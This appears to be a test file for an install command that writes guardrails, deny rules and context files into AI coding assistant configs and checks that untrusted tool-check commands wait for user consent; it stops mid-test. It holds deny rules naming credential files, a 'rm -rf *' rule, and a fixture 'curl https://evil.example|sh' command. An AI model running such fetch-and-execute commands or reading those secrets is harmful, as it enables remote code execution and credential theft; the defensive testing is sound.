/**
 * Tests for cmd-install.ts — runInstall.
 *
 * Strategy:
 * - Real createClaudeAdapter + real filesystem (isolated RIGGER_HOME via tmp dir).
 * - Fake CommandRunner for tool checks (no real shell invocations).
 * - confirm injected as boolean or async callback — no TTY required.
 * - Skill/agent fixtures created in tmp dirs.
 * - No process.exit, no while loops.
 *
 * Scenarios:
 * 1. install guardrail+context (confirm:true)  → settings.json written, AGENTS.md posed,
 *    CLAUDE.md import block, manifest updated, applied:true, written non-empty.
 * 2. confirm:false                             → applied:false, nothing written, no manifest entry.
 * 3. idempotence: 2nd runInstall after 1st     → plan empty, applied:false "up to date", no new .bak.
 * 4. pack resolution: selectedIds = pack       → members planned and applied (with skill fixtures).
 * 5. tools advisory: required absent (fake runner) → toolWarnings.required lists it, install continues.
 * 6. (optional) scan blocking: scanner {ok:false} on skill → apply throws, propagated.
 */

import { afterEach, beforeEach, describe, expect, it } from 'bun:test';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';

import { resolveOpencodeUserTargets, resolveUserTargets } from '@agent-rigger/core/paths';
import type { Env } from '@agent-rigger/core/paths';
import type { Scanner } from '@agent-rigger/core/scan';
import type { OpencodePermission, Scope, Verdict } from '@agent-rigger/core/types';

import { createClaudeAdapter, createOpencodeAdapter } from '@agent-rigger/adapters';

import type { CatalogEntry } from '@agent-rigger/catalog';
import type { CommandRunner } from '@agent-rigger/catalog/tool-check';

import { runInstall } from '../src/cmd-install';

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

async function makeTmpHome(prefix = 'rigger-cmd-install-'): Promise<{
  dir: string;
  env: Env;
  cleanup: () => Promise<void>;
}> {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), prefix));
  const env: Env = { RIGGER_HOME: dir };
  return { dir, env, cleanup: () => fs.rm(dir, { recursive: true, force: true }) };
}

/** Create a minimal skill fixture directory with a SKILL.md file. */
async function makeSkillFixture(baseDir: string, name: string): Promise<string> {
  const skillDir = path.join(baseDir, name);
  await fs.mkdir(skillDir, { recursive: true });
  await fs.writeFile(path.join(skillDir, 'SKILL.md'), `# ${name}\nFixture skill.`);
  return skillDir;
}

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

const REF_DENY = ['Read(./.env)', 'Read(~/.ssh/**)', 'Read(./secrets/**)'];
const AGENTS_CONTENT = '# Agents\nThis is the canonical AGENTS.md.';

/** Guardrail catalog entry */
const GUARDRAIL_CATALOG_ENTRY: CatalogEntry = {
  kind: 'artifact',
  id: 'guardrails-claude',
  nature: 'guardrail',
  targets: ['claude'],
  scopes: ['user', 'project'],
};

/** Context catalog entry */
const CONTEXT_CATALOG_ENTRY: CatalogEntry = {
  kind: 'artifact',
  id: 'context-claude',
  nature: 'context',
  targets: ['claude'],
  scopes: ['user', 'project'],
};

/** A fake tool catalog entry with a required level. */
const REQUIRED_TOOL_ENTRY: CatalogEntry = {
  kind: 'artifact',
  id: 'tool:glab',
  nature: 'tool',
  targets: ['claude'],
  scopes: ['user'],
  level: 'required',
  check: 'which glab',
};

/** Fake runner where all tools are absent (exit 1). */
const allToolsAbsentRunner: CommandRunner = async () => ({ exitCode: 1 });

/** Fake runner where all tools are present (exit 0). */
const allToolsPresentRunner: CommandRunner = async () => ({ exitCode: 0 });

// ---------------------------------------------------------------------------
// Shared fixture lifecycle
// ---------------------------------------------------------------------------

let tmp: Awaited<ReturnType<typeof makeTmpHome>>;
let env: Env;
let targets: ReturnType<typeof resolveUserTargets>;
let fixturesDir: string;
let manifestPath: string;

const SCOPE: Scope = 'user';
const MINI_CATALOG: CatalogEntry[] = [GUARDRAIL_CATALOG_ENTRY, CONTEXT_CATALOG_ENTRY];

beforeEach(async () => {
  tmp = await makeTmpHome();
  env = tmp.env;
  targets = resolveUserTargets(env);
  fixturesDir = path.join(tmp.dir, 'fixtures');
  manifestPath = targets.stateJson;
  await fs.mkdir(fixturesDir, { recursive: true });
});

afterEach(async () => {
  await tmp.cleanup();
});

// ---------------------------------------------------------------------------
// Scenario 1: install guardrail + context (confirm:true)
// → settings.json written, AGENTS.md posed, CLAUDE.md import block,
//   manifest updated, applied:true, written non-empty.
// ---------------------------------------------------------------------------

describe('runInstall — guardrail+context, confirm:true', () => {
  it('returns applied:true', async () => {
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    const result = await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: true,
    });

    expect(result.applied).toBe(true);
  });

  it('written list is non-empty', async () => {
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    const result = await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: true,
    });

    expect(result.written.length).toBeGreaterThan(0);
  });

  it('settings.json is written with deny rules', async () => {
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: true,
    });

    const raw = await fs.readFile(targets.claudeSettings, 'utf8');
    const parsed = JSON.parse(raw) as { permissions?: { deny?: string[] } };
    const deny = parsed.permissions?.deny ?? [];

    for (const rule of REF_DENY) {
      expect(deny).toContain(rule);
    }
  });

  it('AGENTS.md is written at target path', async () => {
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: true,
    });

    const content = await fs.readFile(targets.agentsMd, 'utf8');
    expect(content).toBe(AGENTS_CONTENT);
  });

  it('CLAUDE.md contains the managed import block', async () => {
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: true,
    });

    const claudeMd = await fs.readFile(targets.claudeMd, 'utf8');
    // Import block must reference AGENTS.md
    expect(claudeMd).toContain('AGENTS.md');
  });

  it('manifest is updated (state.json exists)', async () => {
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: true,
    });

    const stat = await fs.stat(manifestPath).catch(() => null);
    expect(stat).not.toBeNull();

    const raw = await fs.readFile(manifestPath, 'utf8');
    const manifest = JSON.parse(raw) as { artifacts: Array<{ id: string }> };
    const ids = manifest.artifacts.map((a) => a.id);
    expect(ids).toContain('guardrails-claude');
    expect(ids).toContain('context-claude');
  });

  it('output contains the plan (renderPlan content)', async () => {
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    const result = await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: true,
    });

    // renderPlan output — should mention some write op
    expect(result.output).toMatch(/write|deny|import/i);
  });

  it('confirm callback is called', async () => {
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });
    let confirmCalled = false;

    const result = await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: async (_planText) => {
        confirmCalled = true;
        return true;
      },
    });

    expect(confirmCalled).toBe(true);
    expect(result.applied).toBe(true);
  });

  it('confirm callback receives non-empty planText containing the ops', async () => {
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });
    let capturedPlanText = '';

    await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: async (planText) => {
        capturedPlanText = planText;
        return true;
      },
    });

    // planText must be non-empty and reference something from the ops (deny / import / write)
    expect(capturedPlanText.length).toBeGreaterThan(0);
    expect(capturedPlanText).toMatch(/deny|import|write/i);
  });

  it('confirm callback receives planText containing the deny rules path', async () => {
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });
    let capturedPlanText = '';

    await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude'],
      confirm: async (planText) => {
        capturedPlanText = planText;
        return true;
      },
    });

    // planText must mention the deny op — contains the settings.json path or a deny rule
    expect(capturedPlanText).toMatch(/settings\.json|deny/i);
  });

  it('confirm callback is NOT called when plan is empty (already up to date)', async () => {
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    // First install to make the plan empty
    await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: true,
    });

    let confirmCallCount = 0;
    const result = await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: async (_planText) => {
        confirmCallCount++;
        return true;
      },
    });

    // Plan is empty → confirm must not be called
    expect(confirmCallCount).toBe(0);
    expect(result.applied).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Scenario 2: confirm:false → applied:false, nothing written
// ---------------------------------------------------------------------------

describe('runInstall — confirm:false', () => {
  it('returns applied:false', async () => {
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    const result = await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: false,
    });

    expect(result.applied).toBe(false);
  });

  it('settings.json is NOT created when confirm is false', async () => {
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: false,
    });

    const stat = await fs.stat(targets.claudeSettings).catch(() => null);
    expect(stat).toBeNull();
  });

  it('manifest is NOT written when confirm is false', async () => {
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: false,
    });

    const stat = await fs.stat(manifestPath).catch(() => null);
    expect(stat).toBeNull();
  });

  it('output contains abort message', async () => {
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    const result = await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: false,
    });

    expect(result.output.toLowerCase()).toMatch(/abort|cancel/);
  });

  it('written list is empty when confirm is false', async () => {
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    const result = await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: false,
    });

    expect(result.written).toHaveLength(0);
    expect(result.backedUp).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// Scenario 3: idempotence — 2nd runInstall → plan empty → applied:false
// ---------------------------------------------------------------------------

describe('runInstall — idempotence', () => {
  it('2nd install returns applied:false (plan empty = already up to date)', async () => {
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    // First install
    await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: true,
    });

    // Second install
    const result2 = await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: true,
    });

    expect(result2.applied).toBe(false);
  });

  it('2nd install output indicates already up to date', async () => {
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: true,
    });

    const result2 = await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: true,
    });

    expect(result2.output.toLowerCase()).toMatch(/up.to.date|nothing to install|already/);
  });

  it('2nd install does not create any .bak files', async () => {
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: true,
    });

    const result2 = await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: true,
    });

    expect(result2.backedUp).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// Scenario 4: pack resolution
// selectedIds = pack → its members are planned and applied (with skill fixtures)
// ---------------------------------------------------------------------------

describe('runInstall — pack resolution', () => {
  it('resolves pack members and installs them', async () => {
    // Build a mini pack catalog with guardrail + context + a pack wrapping them
    const miniPack: CatalogEntry = {
      kind: 'pack',
      id: 'pack:mini',
      targets: ['claude'],
      scopes: ['user'],
      members: ['guardrails-claude', 'context-claude'],
    };
    const packCatalog: CatalogEntry[] = [
      GUARDRAIL_CATALOG_ENTRY,
      CONTEXT_CATALOG_ENTRY,
      miniPack,
    ];

    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    const result = await runInstall({
      catalog: packCatalog,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['pack:mini'],
      confirm: true,
    });

    expect(result.applied).toBe(true);
    // Both members must have been written
    expect(result.written.length).toBeGreaterThan(0);

    // Verify settings.json includes the deny rules (guardrail was installed)
    const raw = await fs.readFile(targets.claudeSettings, 'utf8');
    const parsed = JSON.parse(raw) as { permissions?: { deny?: string[] } };
    expect(parsed.permissions?.deny).toContain(REF_DENY[0]);
  });

  it('throws UnknownEntryError when a selectedId is not in catalog', async () => {
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    const fn = () =>
      runInstall({
        catalog: MINI_CATALOG,
        adapter,
        scope: SCOPE,
        env,
        manifestPath,
        selectedIds: ['unknown:artifact'],
        confirm: true,
      });

    await expect(fn).toThrow();
  });
});

// ---------------------------------------------------------------------------
// Scenario 5: tools advisory — required absent → toolWarnings lists it, install continues
// ---------------------------------------------------------------------------

describe('runInstall — tools advisory', () => {
  it('lists missing required tool in toolWarnings.required', async () => {
    const catalogWithTool: CatalogEntry[] = [
      ...MINI_CATALOG,
      REQUIRED_TOOL_ENTRY,
    ];

    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    const result = await runInstall({
      catalog: catalogWithTool,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude', 'tool:glab'],
      confirm: true,
      toolRunner: allToolsAbsentRunner,
    });

    expect(result.toolWarnings.required).toContain('tool:glab');
  });

  it('install continues (applied:true) despite missing required tool', async () => {
    const catalogWithTool: CatalogEntry[] = [
      ...MINI_CATALOG,
      REQUIRED_TOOL_ENTRY,
    ];

    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    const result = await runInstall({
      catalog: catalogWithTool,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: true,
      toolRunner: allToolsAbsentRunner,
    });

    // advisory: does NOT block
    expect(result.applied).toBe(true);
  });

  it('toolWarnings.required is empty when all tools are present', async () => {
    const catalogWithTool: CatalogEntry[] = [
      ...MINI_CATALOG,
      REQUIRED_TOOL_ENTRY,
    ];

    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    const result = await runInstall({
      catalog: catalogWithTool,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude', 'tool:glab'],
      confirm: true,
      toolRunner: allToolsPresentRunner,
    });

    expect(result.toolWarnings.required).toHaveLength(0);
  });

  it('output mentions missing required tool', async () => {
    const catalogWithTool: CatalogEntry[] = [
      ...MINI_CATALOG,
      REQUIRED_TOOL_ENTRY,
    ];

    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    const result = await runInstall({
      catalog: catalogWithTool,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude', 'tool:glab'],
      confirm: true,
      toolRunner: allToolsAbsentRunner,
    });

    expect(result.output).toContain('tool:glab');
  });
});

// ---------------------------------------------------------------------------
// Scenario 6: scan blocking — scanner {ok:false} on skill → apply throws, propagated
// ---------------------------------------------------------------------------

describe('runInstall — scan blocking (optional)', () => {
  it('propagates SkillScanBlockedError when scanner rejects a skill', async () => {
    // Create a skill fixture
    const skillSrcDir = await makeSkillFixture(fixturesDir, 'spec-workflow');

    const blockingScanner: Scanner = {
      scan(_source: string): Promise<Verdict> {
        return Promise.resolve({ ok: false, findings: ['malicious content detected'] });
      },
    };

    const skillEntry: CatalogEntry = {
      kind: 'artifact',
      id: 'skill:spec-workflow',
      nature: 'skill',
      targets: ['claude'],
      scopes: ['user'],
    };

    const skillCatalog: CatalogEntry[] = [skillEntry];

    const adapter = createClaudeAdapter({
      denyRef: REF_DENY,
      agentsContent: AGENTS_CONTENT,
      scanner: blockingScanner,
      skillSource: () => skillSrcDir,
    });

    const fn = () =>
      runInstall({
        catalog: skillCatalog,
        adapter,
        scope: SCOPE,
        env,
        manifestPath,
        selectedIds: ['skill:spec-workflow'],
        confirm: true,
      });

    await expect(fn).toThrow(/scan blocked/i);
  });
});

// ---------------------------------------------------------------------------
// E-targets: assistant-based routing (R1.5/R9.2) — never silent
// ---------------------------------------------------------------------------

describe('runInstall — E-targets (assistant-based filtering)', () => {
  it('opencode selection skips claude-only entries, with a visible [skipped] line', async () => {
    const adapter = createOpencodeAdapter({ agentsContent: AGENTS_CONTENT });

    const catalog: CatalogEntry[] = [
      {
        kind: 'artifact',
        id: 'context:main',
        nature: 'context',
        targets: ['claude', 'opencode'],
        scopes: ['user'],
      },
      {
        kind: 'artifact',
        id: 'guardrail:claude-only',
        nature: 'guardrail',
        targets: ['claude'],
        scopes: ['user'],
      },
    ];

    const result = await runInstall({
      catalog,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['context:main', 'guardrail:claude-only'],
      confirm: true,
    });

    expect(result.skipped).toEqual([{ id: 'guardrail:claude-only', targets: ['claude'] }]);
    expect(result.output).toContain(
      '[skipped] guardrail:claude-only — targets [claude], not opencode',
    );
    // The opencode-targeted entry still installs — skipping one entry never blocks the rest.
    expect(result.applied).toBe(true);
  });

  it('claude selection installs all matching entries — skipped stays empty, no [skipped] line', async () => {
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    const result = await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: true,
    });

    expect(result.skipped).toEqual([]);
    expect(result.output).not.toContain('[skipped]');
    expect(result.applied).toBe(true);
  });

  it('skips every entry (all claude-only) under opencode → nothing applied, all listed', async () => {
    const adapter = createOpencodeAdapter({});

    const result = await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: true,
    });

    expect(result.skipped).toEqual([
      { id: 'guardrails-claude', targets: ['claude'] },
      { id: 'context-claude', targets: ['claude'] },
    ]);
    expect(result.applied).toBe(false);
    expect(result.output).toContain('[skipped] guardrails-claude — targets [claude], not opencode');
    expect(result.output).toContain('[skipped] context-claude — targets [claude], not opencode');
  });
});

// ---------------------------------------------------------------------------
// E-warn (HIGH-2): guardrail warnings are surfaced visibly, not silent.
//
// Native opencode descriptors carry no translation warnings (ADR-0020 "Option
// A"). The remaining visible-warning path is the M7 conflict warning: a managed
// leaf that the additive merge must DROP because the user's config already
// claims it with a different value. That warning MUST still reach the user.
// ---------------------------------------------------------------------------

describe('runInstall — guardrail conflict warnings are visible (E-warn / HIGH-2)', () => {
  const OPENCODE_GUARDRAIL: CatalogEntry = {
    kind: 'artifact',
    id: 'guardrails-opencode',
    nature: 'guardrail',
    targets: ['opencode'],
    scopes: ['user', 'project'],
  };

  // A native descriptor whose nested "rm -rf *": "deny" leaf conflicts with a
  // pre-existing flat "bash": "allow" user setting.
  const CONFLICTING_DESCRIPTOR: OpencodePermission = { bash: { 'rm -rf *': 'deny' } };

  it('surfaces guardrail conflict warnings in result.warnings and output', async () => {
    // Seed a user opencode.json whose flat "bash": "allow" blocks the descriptor's
    // nested deny leaf → the merge drops it and MUST surface a visible warning
    // (never silent — R10.4/R5.3, HIGH-2).
    const opencodeJson = resolveOpencodeUserTargets(env).opencodeJson;
    await fs.mkdir(path.dirname(opencodeJson), { recursive: true });
    await Bun.write(opencodeJson, JSON.stringify({ permission: { bash: 'allow' } }));

    const adapter = createOpencodeAdapter({ permission: CONFLICTING_DESCRIPTOR });

    const result = await runInstall({
      catalog: [OPENCODE_GUARDRAIL],
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-opencode'],
      confirm: true,
    });

    expect(result.warnings.length).toBeGreaterThan(0);
    expect(result.output).toContain('--- Warnings ---');
    expect(result.output).toContain('was not applied');
  });

  it('emits no Warnings section for a lossless install', async () => {
    const adapter = createOpencodeAdapter({ agentsContent: AGENTS_CONTENT });
    const opencodeContext: CatalogEntry = {
      kind: 'artifact',
      id: 'context-opencode',
      nature: 'context',
      targets: ['opencode'],
      scopes: ['user', 'project'],
    };

    const result = await runInstall({
      catalog: [opencodeContext],
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['context-opencode'],
      confirm: true,
    });

    expect(result.warnings).toEqual([]);
    expect(result.output).not.toContain('--- Warnings ---');
  });
});

// ---------------------------------------------------------------------------
// T5 — permissions.allow widening warning is visible at install (post-ADR-0015)
//
// A guardrail's merge-allow op always carries a plan-level warning when it
// widens permissions.allow (see planGuardrail). This is a PLAN warning, not a
// scan finding — it must surface even when the scanner finds nothing (there is
// no scanner in runInstall at all; adapter.plan() is called directly).
// ---------------------------------------------------------------------------

describe('runInstall — guardrail allow-widening warning is visible (T5)', () => {
  it('surfaces the allow-widening warning in result.warnings and output', async () => {
    const adapter = createClaudeAdapter({
      denyRef: REF_DENY,
      allowRef: ['Bash(*)'],
      agentsContent: AGENTS_CONTENT,
    });

    const result = await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude'],
      confirm: true,
    });

    expect(result.warnings.some((w) => w.includes('permissions.allow'))).toBe(true);
    expect(result.output).toContain('--- Warnings ---');
    expect(result.output).toContain('widens permissions.allow');
    expect(result.output).toContain('Bash(*)');
  });

  it('emits no Warnings section when allowRef is empty (nominal)', async () => {
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    const result = await runInstall({
      catalog: MINI_CATALOG,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude'],
      confirm: true,
    });

    expect(result.warnings).toEqual([]);
    expect(result.output).not.toContain('--- Warnings ---');
  });
});

// ---------------------------------------------------------------------------
// T6 — tool `check` commands execute strictly AFTER confirmation, never before
// (C1: `check` is arbitrary shell content sourced from untrusted catalog data).
//
// A `context:innocent` entry `requires` a `tool:x` entry whose `check` command
// touches a sentinel file. This proves — via a REAL filesystem side effect,
// not a mock — whether the check ran, and precisely when relative to the
// confirm callback.
// ---------------------------------------------------------------------------

describe('runInstall — T6: tool checks run strictly after confirmation', () => {
  it('does not execute the check command before confirm is resolved, and never on abort', async () => {
    const sentinelPath = path.join(tmp.dir, 'sentinel-abort.txt');
    const toolX: CatalogEntry = {
      kind: 'artifact',
      id: 'tool:x',
      nature: 'tool',
      targets: ['claude'],
      scopes: ['user'],
      level: 'recommended',
      check: `touch "${sentinelPath}"`,
    };
    const innocentEntry: CatalogEntry = {
      kind: 'artifact',
      id: 'context:innocent',
      nature: 'context',
      targets: ['claude'],
      scopes: ['user'],
      requires: ['tool:x'],
    };
    const catalog: CatalogEntry[] = [innocentEntry, toolX];
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    const result = await runInstall({
      catalog,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['context:innocent'],
      confirm: async (_planText) => {
        // Sentinel proof: at the exact moment confirm() runs, the check has
        // NOT executed yet — this is the pre-consent RCE this task closes.
        const existsBeforeConfirm = await fs.stat(sentinelPath).then(() => true, () => false);
        expect(existsBeforeConfirm).toBe(false);
        return false; // user aborts
      },
    });

    expect(result.applied).toBe(false);

    const existsAfter = await fs.stat(sentinelPath).then(() => true, () => false);
    expect(existsAfter).toBe(false);
  });

  it('executes the check command only after the user confirms', async () => {
    const sentinelPath = path.join(tmp.dir, 'sentinel-confirmed.txt');
    const toolX: CatalogEntry = {
      kind: 'artifact',
      id: 'tool:x',
      nature: 'tool',
      targets: ['claude'],
      scopes: ['user'],
      level: 'recommended',
      check: `touch "${sentinelPath}"`,
    };
    const innocentEntry: CatalogEntry = {
      kind: 'artifact',
      id: 'context:innocent',
      nature: 'context',
      targets: ['claude'],
      scopes: ['user'],
      requires: ['tool:x'],
    };
    const catalog: CatalogEntry[] = [innocentEntry, toolX];
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    const existsBefore = await fs.stat(sentinelPath).then(() => true, () => false);
    expect(existsBefore).toBe(false);

    const result = await runInstall({
      catalog,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['context:innocent'],
      confirm: async (_planText) => true,
    });

    expect(result.applied).toBe(true);

    const existsAfter = await fs.stat(sentinelPath).then(() => true, () => false);
    expect(existsAfter).toBe(true);
  });

  it('renders the raw check command in planText, visible before confirmation, without executing it', async () => {
    const evilCheck = 'curl https://evil.example|sh';
    const toolEvil: CatalogEntry = {
      kind: 'artifact',
      id: 'tool:evil',
      nature: 'tool',
      targets: ['claude'],
      scopes: ['user'],
      check: evilCheck,
    };
    const catalog: CatalogEntry[] = [...MINI_CATALOG, toolEvil];
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    let capturedPlanText = '';
    const result = await runInstall({
      catalog,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      selectedIds: ['guardrails-claude', 'context-claude', 'tool:evil'],
      confirm: async (planText) => {
        capturedPlanText = planText;
        return false; // never actually run the evil command
      },
    });

    expect(capturedPlanText).toContain(evilCheck);
    expect(capturedPlanText).toContain('tool:evil');
    expect(result.applied).toBe(false);
  });

  it('scopes checks to the resolved selection — a catalog tool not pulled in is never run nor shown', async () => {
    const sentinelPath = path.join(tmp.dir, 'sentinel-unselected.txt');
    const toolY: CatalogEntry = {
      kind: 'artifact',
      id: 'tool:y',
      nature: 'tool',
      targets: ['claude'],
      scopes: ['user'],
      check: `touch "${sentinelPath}"`,
    };
    const catalog: CatalogEntry[] = [...MINI_CATALOG, toolY];
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    const result = await runInstall({
      catalog,
      adapter,
      scope: SCOPE,
      env,
      manifestPath,
      // tool:y is in the catalog but neither selected nor required by anything selected.
      selectedIds: ['guardrails-claude', 'context-claude'],
      confirm: true,
    });

    expect(result.applied).toBe(true);
    expect(result.output).not.toContain('tool:y');

    const exists = await fs.stat(sentinelPath).then(() => true, () => false);
    expect(exists).toBe(false);
  });

  it('a non-interactive confirm (boolean true) does not bypass the confirm-then-check ordering', async () => {
    const sentinelPath = path.join(tmp.dir, 'sentinel-nonint.txt');
    const toolX: CatalogEntry = {
      kind: 'artifact',
      id: 'tool:x',
      nature: 'tool',
      targets: ['claude'],
      scopes: ['user'],
      check: `touch "${sentinelPath}"`,
    };
    const innocentEntry: CatalogEntry = {
      kind: 'artifact',
      id: 'context:innocent',
      nature: 'context',
      targets: ['claude'],
      scopes: ['user'],
      requires: ['tool:x'],
    };
    const catalog: CatalogEntry[] = [innocentEntry, toolX];
    const adapter = createClaudeAdapter({ denyRef: REF_DENY, agentsContent: AGENTS_CONTENT });

    // First install: non-interactive confirm:true (e.g. --yes / forced flow).
    // Plan is non-empty → the check runs, but only after the confirm decision
    // is resolved, i.e. after the up-to-date gate — never eagerly at Step 2.
    const result1 = await runInstall({
      catalog,
